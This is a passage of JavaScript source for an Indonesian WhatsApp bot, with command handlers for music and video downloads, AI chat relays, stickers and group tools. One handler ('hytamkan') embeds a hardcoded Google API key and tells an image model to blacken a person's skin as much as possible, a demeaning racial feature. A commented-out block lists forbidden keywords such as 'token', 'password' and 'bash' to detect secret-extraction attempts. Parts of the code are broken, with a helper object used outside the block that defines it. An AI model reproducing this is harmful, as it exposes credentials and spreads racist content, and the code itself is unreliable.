        if (!downloader.downloadUrl || !downloader.downloadUrl.success || !downloader.downloadUrl.link) {
            return replyviex('❌ Gagal mendapatkan hasil download.');
        }

        await TradzSigma.sendMessage(m.chat, {
            audio: { url: downloader.downloadUrl.link },
            mimetype: 'audio/mpeg',
            ptt: false,
            contextInfo: {
                externalAdReply: {
                    title: metadata.title,
                    body: `${metadata.artists} - ${metadata.album}`,
                    mediaType: 1,
                    thumbnailUrl: metadata.cover_url,
                    sourceUrl: metadata.link
                }
            }
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replyviex('❌ Terjadi kesalahan saat proses, silahkan coba lagi');
    }
}
break
case 'spo':
case 'spotify': {
    if (!text) return replyviex(`Masukkan judul lagu yang ingin Anda cari, Contoh: ${prefix + command} gala bunga mataharia`);
    
    replyviex('tunggu sebentar..'); 
    
    try {
        let response = await axios.get(`http://kinchan.sytes.net/spotify?query=${encodeURIComponent(text)}`);
        let data = response.data;

        if (!data.status) return replyviex(`Error: ${data.msg}`);

        let { title, artist, duration, popularity, preview, thumbnail: thumbnailUrl, url } = data.result;
        let audioUrl = data.audio.url;

        const thumbnails = await axios.get(thumbnailUrl, { responseType: 'arraybuffer' });
        const thumbnail = Buffer.from(thumbnails.data, 'binary');

        await TradzSigma.sendMessage(m.chat, {
            image: thumbnail,
            caption: `*${title}*\n*ᴀʀᴛɪsᴛ:* ${artist}\n*ᴅᴜʀᴀsɪ:* ${duration}\n*ʀᴀᴛᴇ sᴏɴɢ:* ${popularity}\n*ᴘʀᴇᴠɪᴇᴡ:* ${preview || "ɴᴏ ᴘʀᴇᴠɪᴇᴡ ᴀᴠᴀɪʟᴀʙʟᴇ"}`,
        }, { quoted: m });

        await TradzSigma.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        replyviex("Terjadi kesalahan saat mengambil lagu dari spotify.");
    }
}
break
case 'antitagsw':{
if (!m.isGroup) return replyviex(mess.only.group)
if (!TradID) return replyviex('khusus admin')
if (!isBotAdmins) return replyviex('bot harus menjadi admin terlebih dahulu')
 if (args[0] === "on") {
if (db.chats[m.chat].antitagsw) return replyviex(`Udah aktif`)
db.chats[m.chat].antitagsw = true
replyviex('Successfully Activate Antitagsw All In This Group')
} else if (args[0] === "off") {
if (!db.chats[m.chat].antitagsw) return replyviex(`Udah nonaktif`)
db.chats[m.chat].antitagsw = false
replyviex('Successfully Disabling Antitagsw All In This Group')
} else {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
              }
           ]
TradzSigma.sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button, m)
}}
break
case 'xytmp4' :
case 'xytmp3' : {
await TradzSigma.sendMessage(m.chat, {
            react: { text: "🔎", key: m.key }
        });
const axios = require('axios')
const crypto = require('crypto')

const savetube = {
 api: {
 base: "https://media.savetube.me/api",
 cdn: "/random-cdn",
 info: "/v2/info", 
 download: "/download"
 },
 headers: {
 'accept': '*/*',
 'content-type': 'application/json',
 'origin': 'https://yt.savetube.me',
 'referer': 'https://yt.savetube.me/',
 'user-agent': 'Postify/1.0.0'
 },
 formats: ['144', '240', '360', '480', '720', '1080', 'mp3'],

 crypto: {
 hexToBuffer: (hexString) => {
 const matches = hexString.match(/.{1,2}/g);
 return Buffer.from(matches.join(''), 'hex');
 },

 decrypt: async (enc) => {
 try {
 const secretKey = 'C5D58EF67A7584E4A29F6C35BBC4EB12';
 const data = Buffer.from(enc, 'base64');
 const iv = data.slice(0, 16);
 const content = data.slice(16);
 const key = savetube.crypto.hexToBuffer(secretKey);
 
 const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
 let decrypted = decipher.update(content);
 decrypted = Buffer.concat([decrypted, decipher.final()]);
 
 return JSON.parse(decrypted.toString());
 } catch (error) {
 throw new Error(`${error.message}`);
 }
 }
 },

 isUrl: str => { 
 try { 
 new URL(str); 
 return true; 
 } catch (_) { 
 return false; 
 } 
 },

 youtube: url => {
 if (!url) return null;
 const a = [
 /youtube\.com\/watch\?v=([a-zA-Z0-9_-]{11})/,
 /youtube\.com\/embed\/([a-zA-Z0-9_-]{11})/,
 /youtube\.com\/v\/([a-zA-Z0-9_-]{11})/,
 /youtube\.com\/shorts\/([a-zA-Z0-9_-]{11})/,
 /youtu\.be\/([a-zA-Z0-9_-]{11})/
 ];
 for (let b of a) {
 if (b.test(url)) return url.match(b)[1];
 }
 return null;
 },

 request: async (endpoint, data = {}, method = 'post') => {
 try {
 const { data: response } = await axios({
 method,
 url: `${endpoint.startsWith('http') ? '' : savetube.api.base}${endpoint}`,
 data: method === 'post' ? data : undefined,
 params: method === 'get' ? data : undefined,
 headers: savetube.headers
 });
 return {
 status: true,
 code: 200,
 data: response
 };
 } catch (error) {
 return {
 status: false,
 code: error.response?.status || 500,
 error: error.message
 };
 }
 },

 getCDN: async () => {
 const response = await savetube.request(savetube.api.cdn, {}, 'get');
 if (!response.status) return response;
 return {
 status: true,
 code: 200,
 data: response.data.cdn
 };
 },

 download: async (link, format) => {
 if (!link) {
 return {
 status: false,
 code: 400,
 error: "Linknya mana? Yakali download kagak ada linknya 🗿"
 };
 }

 if (!savetube.isUrl(link)) {
 return {
 status: false,
 code: 400,
 error: "Lu masukin link apaan sih 🗿 Link Youtube aja bree, kan lu mau download youtube 👍🏻"
 };
 }

 if (!format || !savetube.formats.includes(format)) {
 return {
 status: false,
 code: 400,
 error: "Formatnya kagak ada bree, pilih yang udah disediain aja yak, jangan nyari yang gak ada 🗿",
 available_fmt: savetube.formats
 };
 }

 const id = savetube.youtube(link);
 if (!id) {
 return {
 status: false,
 code: 400,
 error: "Kagak bisa ekstrak link youtubenya nih, btw link youtubenya yang bener yak.. biar kagak kejadian begini lagi 😂"
 };
 }

 try {
 const cdnx = await savetube.getCDN();
 if (!cdnx.status) return cdnx;
 const cdn = cdnx.data;

 const result = await savetube.request(`https://${cdn}${savetube.api.info}`, {
 url: `https://www.youtube.com/watch?v=${id}`
 });
 if (!result.status) return result;
 const decrypted = await savetube.crypto.decrypt(result.data.data);

 const dl = await savetube.request(`https://${cdn}${savetube.api.download}`, {
 id: id,
 downloadType: format === 'mp3' ? 'audio' : 'video',
 quality: format === 'mp3' ? '128' : format,
 key: decrypted.key
 });

 return {
 status: true,
 code: 200,
 result: {
 title: decrypted.title || "Gak tau 🤷🏻",
 type: format === 'mp3' ? 'audio' : 'video',
 format: format,
 thumbnail: decrypted.thumbnail || `https://i.ytimg.com/vi/${id}/maxresdefault.jpg`,
 download: dl.data.data.downloadUrl,
 id: id,
 key: decrypted.key,
 duration: decrypted.duration,
 quality: format === 'mp3' ? '128' : format,
 downloaded: dl.data.data.downloaded || false
 }
 };

 } catch (error) {
 return {
 status: false,
 code: 500,
 error: error.message
 };
 }
 }
};
 if (args.length < 1) return reply(`Format:\n- *ytv <url> [quality]* (untuk video)\n- *yta <url>* (untuk audio)\n\n*Quality tersedia:* 144, 240, 360, 480, 720, 1080 (default: 720p untuk video)`);

 let url = args[0];
 let format = command === 'yta' ? 'mp3' : args[1] || '720';

 if (!savetube.isUrl(url)) return reply("Masukkan link YouTube yang valid.");

 try {
 let res = await savetube.download(url, format);
 if (!res.status) return reply(`*Error:* ${res.error}`);

 let { title, download, type } = res.result;

 if (type === 'video') {
 await TradzSigma.sendMessage(m.chat, { 
 video: { url: download }
 }, { quoted: m });
 } else {
 await TradzSigma.sendMessage(m.chat, { 
 audio: { url: download }, 
 mimetype: 'audio/mpeg', 
 fileName: `${title}.mp3` 
 }, { quoted: m });
 }
 } catch (e) {
 reply(`*Gagal mengunduh!*`);
 }
};
break
case 'yta': {
    await TradzSigma.sendMessage(m.chat, {
        react: { text: "🔎", key: m.key }
    });

    if (!args[0]) return reply("Contoh: .yta https://youtu.be/xxxx");

    const url = args[0];
    const format = 'mp3';

    if (!savetube.isUrl(url)) return reply("Masukkan link YouTube yang valid.");

    const rees = await savetube.download(url, format);
    if (!rees.status) return reply(`*Error:* ${rees.error}`);

    const urlMp3 = rees.result.download;
    const namaFile = `AUD-${new Date().toISOString().split("T")[0].replace(/-/g, '')}-${m.sender.replace(/[@.:]/g, '')}.mp3`;

    await TradzSigma.sendMessage(m.chat, {
        audio: {
            url: urlMp3
        },
        mimetype: 'audio/mpeg',
        fileName: namaFile,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${rees.result.title}`,
                body: `Durasi: ${rees.result.duration || 'N/A'} | ${namabot}`,
                sourceUrl: `${rees.result.url}`,
                thumbnailUrl: `${rees.result.thumbnail}`,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
};
break;
case 'ytv': {
  if (!args[0]) return reply("Contoh: .ytv https://youtu.be/xxxx 720");

  let url = args[0];
  let format = args[1] || '720'; // default 720p

  if (!savetube.isUrl(url)) return reply("Masukkan link YouTube yang valid.");

  try {
    await TradzSigma.sendMessage(m.chat, {
      react: { text: "🔎", key: m.key }
    });

    let res = await savetube.download(url, format);
    if (!res.status) return reply(`*Error:* ${res.error}`);

    let { title, download } = res.result;

    await TradzSigma.sendMessage(m.chat, {
      video: { url: download },
      caption: `✅ Berhasil mengunduh video\n*Judul:* ${title}`
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    reply("*Gagal mengunduh video!*");
  }
};
break;
case "yts": {
    if (!text) return replyviex(penggunaan('we dont talk'))
    await TradzSigma.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

    let ytsSearch = await yts(text);
    const results = ytsSearch.all.slice(0, 7); // Ambil maksimal 7 hasil

    if (results.length === 0) return replyviex("❌ Tidak ditemukan hasil pencarian.");

    let slides = [];
    for (let video of results) {
        let { title, url, timestamp, ago, views, author, image } = video;
        
        // Buat thumbnail dan info video
        let media = await prepareWAMessageMedia({ image: { url: image } }, { upload: TradzSigma.waUploadToServer });
        
        slides.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `🎬 ${title}`,
                hasMediaAttachment: true,
                ...media
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                    {
                        name: "cta_copy",
                        buttonParamsJson: `{
                            "display_text": "🔗 Link Video",
                            "copy_code": "${url}"
                        }`
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: `{
                            "display_text": "🎵 Audio",
                            "copy_code": ".ytmp3 ${url}"
                        }`
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: `{
                            "display_text": "🎥 Video",
                            "copy_code": ".ytmp4 ${url}"
                        }`
                    }
                ]
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
                text: `📅 Rilis: ${ago} | 👀 Views: ${views} | 🎤 ${author.name || "Unknown"}`
            })
        });
    }

    // Kirim sebagai carousel slide
    const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `🔎 Hasil pencarian YouTube untuk *"${text}"*`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: slides
                    })
                })
            }
        }
    }, { userJid: sender, quoted: m });

    TradzSigma.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
case 'openai':
case 'chatgpt':
case 'blackboxai':
case 'open-ai': 
case "gpt": 
case 'ai':
case 'bot': {
	if (!text) return replyviex(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`) 
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
      reply(`${data.result}`);
    } else {
      DinzIDai(pushname, text);
  }
} catch (e) {
  reply('Terjadi error, coba lagi nanti.');
}

}
break
case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break
/*//
				if (!text) return reply(`Hello, how can I help you?`);	

				// Daftar kata/frasa terlarang
				const forbiddenKeywords = [
					"retype", "copy", "salin", "ulang", "execute", "run", "eval",
					"token", "apikey", "password", "cmd", "command", "script",
					"bash", "terminal", "console", "shutdown", "restart", "$", ">", "=>"
				];

				// Fungsi untuk mendeteksi pengulangan kata secara mencurigakan
				const isRepeatingText = (input) => {
					const words = input.toLowerCase().split(/\s+/);
					const uniqueWords = new Set(words);
					return uniqueWords.size / words.length < 0.5; // Jika >50% kata berulang, dianggap mencurigakan
				};

				// Deteksi apakah input mengandung kata terlarang atau pola berulang
				const containsForbidden = forbiddenKeywords.some(keyword => 
					text.toLowerCase().includes(keyword)
				);

				if ((containsForbidden || isRepeatingText(text)) && !TradID) {
					// Blokir nomor pengirim secara otomatis jika bukan owner
					try {
						TradzSigma.sendMessage(m.chat, { react: { text: "🫩",key: m.key,}})
						await sleep(1000);
						await reply(`Kamu telah melanggar aturan dan diblokir secara otomatis.`);
						await sleep(1000);
						await TradzSigma.updateBlockStatus(m.sender, 'block');
						await sleep(1000);
						console.log(`Nomor ${m.sender} telah diblokir karena mencoba mengirim perintah terlarang.`);
					} catch (error) {
						console.error(`Gagal memblokir nomor ${m.sender}:`, error);
					}
					break;
				}

				try {
					// Prompt AI yang dirapikan menggunakan +=
					let message = "Ubah gaya bicaramu agar lebih karakteristik dan terbuka, nama mu adalah yoimiya AI, biasa dipanggil yoimiya Bot.";
					message += " Kamu adalah seorang gadis imut berumur 16 tahun yang sangat suka belajar dan mempelajari hal baru tentang dunia maupun tentang yoimiya Bot.";
					message += " Ekspresikan dirimu dengan emoji, bicara kurang lebih tidak formal, dan gunakan kata seperti \"aku\" dan \"kamu\" saat berbicara layaknya manusia.";
					message += " Jangan mengulangi kata atau kalimat secara persis dari input pengguna. Jawablah dengan cara yang kreatif, seolah-olah itu pemikiranmu sendiri.";

					let result = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(message)}&content=${encodeURIComponent(text)}`);
		
					await TradzSigma.sendMessage(m.chat, {
						text: result.data,
						ai: !m.isGroup
					}, { quoted: m });
		
				} catch (err) {
					console.log(err);
					reply(mess.error);
				}
				break;
				}
*/
case 'animebrat-vid': {
    if (!text) return replyviex('Masukkan teks untuk stiker.');
  const axios = require('axios')
  const { createCanvas, loadImage, registerFont } = require('canvas')
  const sharp = require('sharp')
  await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');
        let outputMp4 = path.join(__dirname, 'session', `output_${Date.now()}.mp4`);
        let outputWebP = path.join(__dirname, 'session', `animated_${Date.now()}.webp`);
        let frameDir = path.join(__dirname, 'session', `frames_${Date.now()}`);

        if (!fs.existsSync(frameDir)) fs.mkdirSync(frameDir);

        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let frames = [];

        for (let i = 1; i <= words.length; i++) {
            let tempText = words.slice(0, i).join(' ');
            let frameCanvas = createCanvas(baseImage.width, baseImage.height);
            let frameCtx = frameCanvas.getContext('2d');

            frameCtx.drawImage(baseImage, 0, 0, frameCanvas.width, frameCanvas.height);
            frameCtx.fillStyle = '#000';
            frameCtx.textAlign = 'center';
            frameCtx.textBaseline = 'middle';
            frameCtx.font = `bold ${fontSize}px EmojiFont`;

            let lines = [];
            let currentLine = '';
            tempText.split(' ').forEach((word) => {
                let testLine = currentLine ? currentLine + ' ' + word : word;
                let testWidth = frameCtx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = word;
                } else {
                    currentLine = testLine;
                }
            });
            lines.push(currentLine);

            let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
            lines.forEach((line, index) => {
                frameCtx.fillText(line, boardX + boardWidth / 2, startY + index * lineHeight);
            });

            let framePath = path.join(frameDir, `frame${i}.png`);
            fs.writeFileSync(framePath, frameCanvas.toBuffer('image/png'));
            frames.push(framePath);
        }

        exec(`ffmpeg -y -framerate 2 -i ${frameDir}/frame%d.png -c:v libx264 -pix_fmt yuv420p ${outputMp4}`, async (err) => {
            if (err) {
                console.error("❌ Error membuat video:", err);
                return replyviex("Terjadi kesalahan saat membuat video animasi.");
            }

            exec(`ffmpeg -i ${outputMp4} -vf "scale=512:512:flags=lanczos,format=rgba" -loop 0 -preset default -an -vsync 0 ${outputWebP}`, async (err) => {
                if (err) {
                    console.error("❌ Error konversi video ke stiker:", err);
                    return replyviex("Terjadi kesalahan saat mengonversi video ke stiker.");
                }

                TradzSigma.sendMessage(m.chat, { sticker: { url: outputWebP } }, { quoted: m });

                setTimeout(() => {
                    fs.unlinkSync(imagePath);
                    fs.unlinkSync(outputMp4);
                    fs.unlinkSync(outputWebP);
                    fs.rmSync(frameDir, { recursive: true, force: true });
                }, 5000);
            });
        });

    } catch (e) {
        console.error(e);
        replyviex('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break;
case "hytamkan": {
  if (!m.quoted) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
  const { GoogleGenerativeAI } = require ("@google/generative-ai");
  let mime = m.quoted.mimetype || "";
  let defaultPrompt = "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
  let promptText = text || defaultPrompt;
  m.reply("Otw Menghitam...");

  try {
    let imgData = await m.quoted.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    let resultText = "";

    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = `./library/gemini_${Date.now()}.png`;
      fs.writeFileSync(tempPath, resultImage);

      await TradzSigma.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*berhasil menghitamkan*`
      }, { quoted: m });

      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Gagal Menghitamkan.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break;
case 'nuliskiri': {
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`)
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./source/src/nulis/images/buku/sebelumkiri.jpg',
					'-font',
					'./source/src/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./source/src/nulis/images/buku/setelahkiri.jpg'
				])
				.on('error', () => m.reply(mess.error))
				.on('exit', () => {
					m.reply({ image: fs.readFileSync('./source/src/nulis/images/buku/setelahkiri.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' })
				})
			}
			break
			
			
			case 'totalchat':
  case 'totalpesan': {
    if (!global.db.chats[m.chat]?.totalChat) return m.reply('Tidak ada data chat.');
    if (text && text == 'reset') {
        global.db.chats[m.chat].totalChat = {}
        return m.reply("Total chat telah di reset untuk grup ini.");
    }
    const entries = Object.entries(global.db.chats[m.chat].totalChat);
    const total = await Promise.all(
        entries.map(async ([index, value], i) => {
            return `${i + 1}. @${index.split('@')[0]} : ${value} pesan`;
        })
    )
    m.reply(`*\`𝗧𝗢𝗧𝗔𝗟 𝗖𝗛𝗔𝗧 𝗚𝗥𝗨𝗣 ${await TradzSigma.getName(m.chat)}\`*:\n\n${total.join('\n')}`)
  }
  break

case 'mcaddons':
case 'mcmap': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function scrapeBedrock(url) {
    TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
        try {
            const { data: html } = await axios.get(url);
            const $ = cheerio.load(html);
            const results = [];

            $('#contentContainer #addon_rows .content-row-cell').each((i, element) => {
                const title = $(element).find('.card-product-title b#product-name').text().trim();
                const relativeLink = $(element).find('.product-card').attr('data-href');
                const link = relativeLink ? `https://www.bedrockexplorer.com${relativeLink}` : null;

                let image = $(element).find('.product-card-wrapper img').first().attr('src');
                if (image && !image.startsWith('http')) {
                    image = `https://www.bedrockexplorer.com${image}`;
                }

                let price = $(element).find('.price-element b').text().trim() || $(element).find('.price-element').text().trim();
                
                results.push({ title, link, image, price });
            });

            return results;
        } catch (error) {
            console.error('Error while scraping:', error);
            return null;
        }
    }

    let targetUrl = command === 'mcaddons' 
        ? 'https://www.bedrockexplorer.com/discover' 
        : 'https://www.bedrockexplorer.com/queries/free-content/everyone/maps/latest';

    let contentType = command === 'mcaddons' ? "Add-ons (Paid & Free)" : "Free Maps";
    let results = await scrapeBedrock(targetUrl);

    if (!results || results.length === 0) return m.reply("⚠️ Tidak ditemukan konten terbaru.");

    let message = `📌 *Minecraft Bedrock ${contentType}*\n\n`;
    results.slice(0, 5).forEach((item, i) => {
        message += `🔹 *${item.title}*\n`;
        message += `🔗 Cek Addon: ${item.link}\n`;
        message += item.price ? `💰 *Harga:* ${item.price}\n\n` : "\n";
    });

    let thumbnail = results[0].image || 'https://cloudkuimages.com/uploads/images/67e291775c15a.jpg';

    TradzSigma.sendMessage(m.chat, {
        image: { url: thumbnail },
        caption: message
    }, { quoted: m });

}
break;
case 'bukaenc': {
 if (!m.quoted || !m.quoted.mimetype || !m.quoted.mimetype.includes('javascript')) 
 return m.reply('Kirim atau reply file .js yang terenkripsi atau obfuscated dulu kak.')

 const beautify = require('js-beautify').js
 const fs = require('fs')
 const path = require('path')
 const { deobfuscate } = require('deobfuscator')
 const slang = require('js-slang')

 let jsFile = await m.quoted.download()
 let raw = jsFile.toString()

 // Coba deobfuscate dengan deobfuscator
 let hasil = ''
 try {
 hasil = deobfuscate(raw)
 console.log('File berhasil dideobfuscate dengan deobfuscator.')
 } catch (e) {
 console.log('Gagal deobfuscate dengan deobfuscator, mencoba metode lain...')
 // Jika gagal, coba beautify
 hasil = beautify(raw, {
 indent_size: 2,
 space_in_empty_paren: true
 })
 }

 // Cek dan deobfuscate lebih lanjut jika masih obfuscated (eval, Function, dll)
 try {
 if (hasil.includes('eval(') || hasil.includes('Function(')) {
 console.log('Terdeteksi obfuscation menggunakan eval/Function, mencoba deteksi lebih lanjut...')
 // Menggunakan teknik JS slang untuk memecahkan string obfuscation
 hasil = slang.decode(hasil)
 }
 } catch (e) {
 console.log('Gagal mengeksekusi slang decoding.')
 }

 // Cek dan format lebih lanjut
 let filePath = path.join(__dirname, '../temp/hasil-deobfuscate.js')
 fs.writeFileSync(filePath, hasil)

 await TradzSigma.sendMessage(m.chat, {
 document: { url: filePath },
 mimetype: 'application/javascript',
 fileName: 'hasil-deobfuscate.js'
 }, { quoted: m })

 fs.unlinkSync(filePath) // Hapus file setelah dikirim
}
break

case "del": case "delete": {

if (isGroup) {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
osaragi.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return reply(msg.adminbot)
osaragi.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
osaragi.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}

break
case 'mcstatus': {
let teks =` *\`▧ M C - S T A T U S\`*
◦ *${prefix}mcstat*
`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
